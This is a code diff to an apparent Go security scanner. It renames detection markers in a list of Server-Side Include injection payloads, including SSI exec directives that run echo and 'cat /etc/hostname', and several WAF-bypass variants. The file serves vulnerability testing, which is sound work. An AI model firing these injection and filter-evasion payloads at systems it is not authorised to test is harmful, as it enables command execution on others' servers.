@@ -30,8 +30,8 @@ func GetAllPayloads() []Payload {
 // Source: OWASP WSTG-INPV-08, PayloadsAllTheThings
 var standardPayloads = []Payload{
 	{
-		Value:       `<!--#exec cmd="echo assay_ssi_test"-->`,
-		Marker:      "assay_ssi_test",
+		Value:       `<!--#exec cmd="echo vigil_ssi_test"-->`,
+		Marker:      "vigil_ssi_test",
 		Description: "SSI exec command directive",
 	},
 	{
@@ -71,7 +71,7 @@ var standardPayloads = []Payload{
 	},
 	{
 		Value:       `<!--#exec cmd="cat /etc/hostname"-->`,
-		Marker:      "assay_ssi_test",
+		Marker:      "vigil_ssi_test",
 		Description: "SSI exec cat hostname",
 	},
 	{
@@ -85,26 +85,26 @@ var standardPayloads = []Payload{
 // Source: PayloadsAllTheThings, HackTricks
 var wafBypassPayloads = []Payload{
 	{
-		Value:       "<!--#exec%20cmd=\"echo assay_ssi_waf\"-->",
-		Marker:      "assay_ssi_waf",
+		Value:       "<!--#exec%20cmd=\"echo vigil_ssi_waf\"-->",
+		Marker:      "vigil_ssi_waf",
 		Description: "URL-encoded space in SSI directive",
 		WAFBypass:   true,
 	},
 	{
-		Value:       "<!--#exec\tcmd=\"echo assay_ssi_tab\"-->",
-		Marker:      "assay_ssi_tab",
+		Value:       "<!--#exec\tcmd=\"echo vigil_ssi_tab\"-->",
+		Marker:      "vigil_ssi_tab",
 		Description: "Tab character in SSI directive",
 		WAFBypass:   true,
 	},
 	{
-		Value:       "<!--#EXEC CMD=\"echo assay_ssi_upper\"-->",
-		Marker:      "assay_ssi_upper",
+		Value:       "<!--#EXEC CMD=\"echo vigil_ssi_upper\"-->",
+		Marker:      "vigil_ssi_upper",
 		Description: "Uppercase SSI directive bypass",
 		WAFBypass:   true,
 	},
 	{
-		Value:       "<!--#exec cmd='echo assay_ssi_sq'-->",
-		Marker:      "assay_ssi_sq",
+		Value:       "<!--#exec cmd='echo vigil_ssi_sq'-->",
+		Marker:      "vigil_ssi_sq",
 		Description: "Single-quoted SSI directive",
 		WAFBypass:   true,
 	},
